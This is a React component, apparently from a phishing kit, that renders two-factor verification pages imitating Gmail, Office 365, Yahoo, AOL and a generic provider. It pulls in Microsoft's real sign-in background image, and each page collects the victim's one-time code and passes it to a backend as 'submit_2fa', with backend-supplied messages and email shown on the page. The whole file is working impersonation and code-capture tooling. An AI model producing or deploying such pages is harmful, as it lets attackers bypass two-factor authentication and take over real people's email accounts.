import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface TwoFactorPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Full-screen "two-factor authentication required" page themed per provider.
 * The user enters a 6-8 digit code from their authenticator app (TOTP) or an
 * alternative method. Other 2FA variants (SMS / push prompt) have their own
 * dedicated pages.
 */
const TwoFactorPage: React.FC<TwoFactorPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const appName = (data.appName as string) || 'your authenticator app';
  const backendMessage = (data.message as string) || '';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: '2-Step Verification',
    office365: 'Enter code',
    yahoo: 'Verify your identity',
    aol: 'Two-step verification',
    others: 'Two-factor authentication',
  };

  const description = backendMessage || `Open ${appName} and enter the 6-digit verification code for your account.`;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_2fa', { code });
  };
  const tryAnotherWay = () => onAction('request_alternate_method', { email });
  const goBackHome = () => { onAction('cancel'); navigate(-1); };

  // Gmail
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12" style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}>
            <form onSubmit={handleSubmit}>
              <div className="flex flex-col md:flex-row md:gap-16">
                <div className="md:w-1/2 md:pt-4">
                  <ProviderLogo providerKey="gmail" />
                  <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">{headline.gmail}</h1>
                  <p className="text-[16px] leading-6 text-gray-900 mt-4 max-w-md">{description}</p>
                  {email && (
                    <div className="mt-6">
                      <button type="button" onClick={goBackHome} className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full">
                        <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">{email.charAt(0).toUpperCase()}</div>
                        <span className="text-sm text-gray-800 pr-1">{email}</span>
                      </button>
                    </div>
                  )}
                </div>
                <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                  <h2 className="text-[18px] text-gray-900 font-normal mb-2">Enter the code from your authenticator app</h2>
                  <label className="block text-xs text-gray-600 mb-1 mt-4">Verification code</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    value={code}
                    onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                    maxLength={8}
                    autoFocus
                    className="w-full px-3 py-3 text-lg tracking-[0.4em] border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
                  />
                  <div className="flex justify-between items-center mt-12">
                    <button type="button" onClick={tryAnotherWay} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>Try another way</button>
                    <button type="submit" disabled={code.length < 6 || submitting} className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                      {submitting ? 'Verifying\u2026' : 'Next'}
                    </button>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </main>
      </div>
    );
  }

  // Office365
  if (providerKey === 'office365') {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundColor: '#e9e9e9',
        }}
      >
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5"><ProviderLogo providerKey="office365" /></div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button type="button" onClick={goBackHome} className="mr-2 text-[#1b1b1b]" aria-label="Back">&larr;</button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">{headline.office365}</h1>
          <p className="text-sm text-[#1b1b1b] mb-5">{description}</p>
          <form onSubmit={handleSubmit}>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              placeholder="Code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              maxLength={8}
              autoFocus
              className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
              style={{ borderBottomColor: '#666' }}
            />
            <div className="mt-3">
              <label className="inline-flex items-center text-sm text-[#1b1b1b]">
                <input type="checkbox" className="mr-2" />
                Don&rsquo;t ask me again for 14 days
              </label>
            </div>
            <div className="mt-3 flex flex-col gap-1">
              <button type="button" onClick={tryAnotherWay} className="text-sm text-[#0067b8] hover:underline text-left w-fit">Sign in another way</button>
              <button type="button" onClick={() => onAction('more_info')} className="text-sm text-[#0067b8] hover:underline text-left w-fit">More information</button>
            </div>
            <div className="mt-6 flex justify-end">
              <button type="submit" disabled={code.length < 6 || submitting} className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60" style={{ backgroundColor: theme.primary, minWidth: '108px' }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Yahoo
  if (providerKey === 'yahoo') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-6 px-10"><ProviderLogo providerKey="yahoo" className="h-8" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-[400px] px-8 py-10 bg-white rounded-2xl" style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}>
            <h2 className="text-[22px] font-bold text-gray-900 text-center mb-2">{headline.yahoo}</h2>
            {email && (<div className="my-3 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate text-center">{email}</div>)}
            <p className="text-sm text-gray-600 text-center mb-5">{description}</p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <label className="block text-xs text-gray-600">Verification code</label>
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full border-b pt-2 pb-2 text-base tracking-[0.3em] focus:outline-none"
                style={{ borderColor: '#dcdfe0' }}
              />
              <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-4 py-3 text-white font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </form>
            <div className="mt-4 flex justify-between text-sm">
              <button type="button" onClick={tryAnotherWay} className="font-medium" style={{ color: theme.primary }}>Try another way</button>
              <button type="button" onClick={goBackHome} className="font-medium" style={{ color: theme.primary }}>Cancel</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // AOL
  if (providerKey === 'aol') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-4 px-6 border-b border-gray-200"><ProviderLogo providerKey="aol" className="h-6" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[400px] py-12 px-10 bg-white rounded-xl border border-gray-200">
            <h2 className="text-center text-2xl font-bold text-gray-900 mb-3">{headline.aol}</h2>
            {email && (<div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate mb-3">{email}</div>)}
            <p className="text-sm text-gray-600 text-center mb-5">{description}</p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full border-b pt-2 pb-2 text-base tracking-[0.25em] focus:outline-none"
                style={{ borderColor: '#dcdfe0' }}
              />
              <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-4 py-3 text-white font-bold rounded-md text-base disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </form>
            <div className="mt-4 flex justify-between text-sm">
              <button type="button" onClick={tryAnotherWay} className="hover:underline" style={{ color: theme.primary }}>Try another way</button>
              <button type="button" onClick={goBackHome} className="hover:underline" style={{ color: theme.primary }}>Cancel</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // Others (generic)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8">
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] text-center mb-2">{headline.others}</h1>
          {email && (<p className="text-sm text-gray-600 text-center mb-2">{email}</p>)}
          <p className="text-sm text-[#555] text-center mb-6">{description}</p>
          <form onSubmit={handleSubmit}>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              maxLength={8}
              autoFocus
              placeholder="123456"
              className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
              style={{ borderColor: '#d1d1d1' }}
            />
            <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-6 py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60" style={{ backgroundColor: theme.primary }}>
              {submitting ? 'Verifying\u2026' : 'Verify and continue'}
            </button>
          </form>
          <div className="mt-6 flex justify-between text-sm">
            <button type="button" onClick={tryAnotherWay} className="hover:underline" style={{ color: theme.primary }}>Try another way</button>
            <button type="button" onClick={goBackHome} className="hover:underline" style={{ color: theme.primary }}>Cancel</button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default TwoFactorPage;
